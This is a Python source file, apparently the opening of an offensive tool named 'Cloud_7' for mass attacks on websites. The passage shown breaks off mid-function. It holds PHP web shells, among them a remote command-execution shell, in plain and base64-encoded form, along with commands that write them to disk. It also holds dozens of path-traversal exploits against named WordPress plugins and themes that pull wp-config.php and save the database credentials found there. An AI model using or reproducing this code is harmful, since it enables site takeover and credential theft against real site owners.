import os
import sys
import re
import requests
import socket
import base64
import urllib
import urllib2
import time
import cookielib
import urllib3
import colorama
import datetime
import random
import json
import binascii
import codecs
import argparse
import traceback
import subprocess
import webbrowser
import warnings
from multiprocessing.dummy import Pool
from time import time as timer
from platform import system
from urllib import urlopen
from random import sample as rand
from bs4 import BeautifulSoup
from datetime import datetime
from colorama import init
from colorama import Fore
from colorama import Style
from Queue import Queue
from pprint import pprint
from lxml.html import fromstring
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)
#sys.setdefaultencoding('utf8')

try:
	os.system('title >> Cloud_7 <<')
except:
	pass

init(autoreset=True)
fm = Fore.RED
fb = Fore.BLUE
fk = Fore.YELLOW
fi = Fore.GREEN
fc = Fore.CYAN
fp = Fore.WHITE
fu = Fore.MAGENTA
sd = Style.DIM
fr = Fore.RESET
sn = Style.NORMAL
sb = Style.BRIGHT

def banner():
	ww = "\x1b[0m"
	ran = [34, 37, 32, 37, 31, 36]
	xx = """
   ___ _            ________
  / __| |___ _  _ __| |__  |
 | (__| / _ \ || / _` | / / 
  \___|_\___/\_,_\__,_|/_/

  More Tools : https://t.me/hackingtoolsprvi8
                            
  [1] Get SMTP/VPS/DATABASE From Config/Environment
  [2] WordPress Upload Shell (139 Exploit + Bypassing Shell)
  [3] Webmin 1.9xx Remote Code Execution
  [4] PrestaShop Upload Shell (57 Exploit + Bypassing Shell)
  [5] Kcfinder, PHPUnit, vBulletin, jQuery, osCommerce, Other Web filemanager Mass Upload Shell 
  [6] All CMS BruteForce With 1000 Wordlist
  [7] Priv Bing Dorker 500 Page
  [8] Get IP From List Website
  [9] Grab Web List From IP
  [10] Joomla Upload Shell (102 Exploit + Bypassing Shell) < Looping Exploit


  [99] Contact Me :) 


	"""
	for N, line in enumerate(xx.split('\n')):
		sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(ran),line ,ww))
		time.sleep(0.07)
banner()
Choss = raw_input('Choose : ')
paypriv = """echo "Uploader_By_Cloud7_Agath_ <?php echo '<html><head><title>Uploader_By_Cloud7_Agath_</title> </head>'; echo 'Uploader_By_Cloud7_Agath_<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; } else { echo '<b>Not uploaded ! </b><br><br><html>'; } } ?>" > Uploader_By_Cloud7_Agath.php"""
p = "Uploader_By_Cloud7_Agath_ <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }"
p_d = "VXBsb2FkZXJfQnlfQ2xvdWQ3X0FnYXRoXyA8P3BocCBpZiggaXNzZXQoICRfUkVRVUVTVFsnYyddICkgKSB7IHN5c3RlbSggJF9SRVFVRVNUWydjJ10gLiAnIDI+JjEnICk7IH0="
encoded = base64.b64encode(p.encode('utf-8'))
command_three = "echo Uploader_By_Cloud7_Agath_ <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); } | tee Uploader_By_Cloud7_Agath.php"
command_two = "Uploader_By_Cloud7_Agath_ <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); } > Uploader_By_Cloud7_Agath.php"
command_one = "echo " + str(encoded) + " | base64 -d | tee Uploader_By_Cloud7_Agath.php"
shell = """<?php echo '<html><head><title>Uploader_By_Cloud7_Agath_</title> </head>'; echo 'Uploader_By_Cloud7_Agath_<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; } else { echo '<b>Not uploaded ! </b><br><br><html>'; } } ?>"""
php = 'Files/Uploader_By_Cloud7_Agath.php'
php5 = 'Files/Uploader_By_Cloud7_Agath.php5'
phtml = 'Files/Uploader_By_Cloud7_Agath.phtml'
php7 = 'Files/Uploader_By_Cloud7_Agath.php7'
jd = 'Files/Uploader_By_Cloud7_Agath.php.jd'
jpg = 'Files/Uploader_By_Cloud7_Agath.jpg'
phpjpg = 'Files/Uploader_By_Cloud7_Agath.php.jpg'
php3 = 'Files/Uploader_By_Cloud7_Agath.php3.g'
phpj = 'Files/Uploader_By_Cloud7_Agath.php.j'
xxxjpg = 'Files/Uploader_By_Cloud7_Agath.php.xxxjpg'
zipp = 'Files/revslider.zip'
Wordlist = 'Files/1000_Wordlist.txt'
B64D = 'Files/Base64Drupal.txt'
J0MRCE = 'Files/Base64JoomlaRCE.txt'
EnumUS = 'Files/EnumerateUser.txt'
PDRCE = 'Files/PayloadDrupalRCE.txt'
R_Node = 'Files/Random_Node.txt'

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'}
x = datetime.now()


class Con:
	def WP_eCommerce_Config(self, url):
		try:
			e = (url+'/wp-content/plugins/wp-e-commerce/wpsc-includes/misc.functions.php?image_name=../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}WP_eCommerce_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + ' Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}WP_eCommerce_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}WP_eCommerce_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}WP_eCommerce_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Revslider_Config(self, url):
		try:
			e = (url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Revslider_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + ' Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Revslider_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Revslider_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Revslider_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def WP_Support_Responsive_Config(self, url):
		try:
			e = (url+'/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/downloadAttachment.php?dirc=../../../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}WP_Support_Responsive_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + ' Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}WP_Support_Responsive_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}WP_Support_Responsive_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}WP_Support_Responsive_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Eshop_Magic_Config(self, url):
		try:
			e = (url+'/wp-content/plugins/eshop-magic/download.php?file=../../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Eshop_Magic_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + ' Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Eshop_Magic_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Eshop_Magic_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Eshop_Magic_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Ungallery_Config(self, url):
		try:
			e = (url+'/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Ungallery_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + ' Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Ungallery_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Ungallery_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Ungallery_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Membership_Config(self, url):
		try:
			e = (url+'/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=/wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Membership_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + ' Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Membership_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Membership_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Membership_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Mac_Photo_Gallery_Config(self, url):
		try:
			e = (url+'/wp-content/plugins/mac-photo-gallery/macdownload.php?albid=/wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Mac_Photo_Gallery_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + ' Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Mac_Photo_Gallery_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Mac_Photo_Gallery_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Mac_Photo_Gallery_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Acento_Config(self, url):
		try:
			e = (url+'/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Acento_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + ' Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Acento_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Acento_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Acento_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Ajax_Store_Config(self, url):
		try:
			e = (url+'/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Ajax_Store_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Ajax_Store_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Ajax_Store_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Ajax_Store_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Antioch_Config(self, url):
		try:
			e = (url+'/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Antioch_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Antioch_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Antioch_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Antioch_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Authentic_Config(self, url):
		try:
			e = (url+'/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Authentic_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Authentic_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Authentic_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Authentic_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Churchope_Config(self, url):
		try:
			e = (url+'/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Churchope_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Churchope_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Churchope_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Churchope_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Epic_Config(self, url):
		try:
			e = (url+'/wp-content/themes/epic/includes/download.php?file=wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Epic_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Epic_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Epic_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Epic_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Felis_Config(self, url):
		try:
			e = (url+'/wp-content/themes/felis/download.php?file=../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Felis_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Felis_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Felis_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Felis_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Force_Config(self, url):
		try:
			e = (url+'/wp-content/force-download.php?file=../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Force_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Force_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Force_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Force_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def HD_Audio_Config(self, url):
		try:
			e = (url+'/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}HD_Audio_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}HD_Audio_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}HD_Audio_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}HD_Audio_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def History_Collection_Config(self, url):
		try:
			e = (url+'/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}History_Collection_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}History_Collection_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}History_Collection_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}History_Collection_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Image_Export_Config(self, url):
		try:
			e = (url+'/wp-content/plugins/image-export/download.php?file=../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Image_Export_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Image_Export_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Image_Export_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Image_Export_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Kbslider_Config(self, url):
		try:
			e = (url+'/wp-content/plugins/image-export/download.php?file=../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Kbslider_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Kbslider_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Kbslider_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Kbslider_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Linenity_Config(self, url):
		try:
			e = (url+'/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Linenity_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
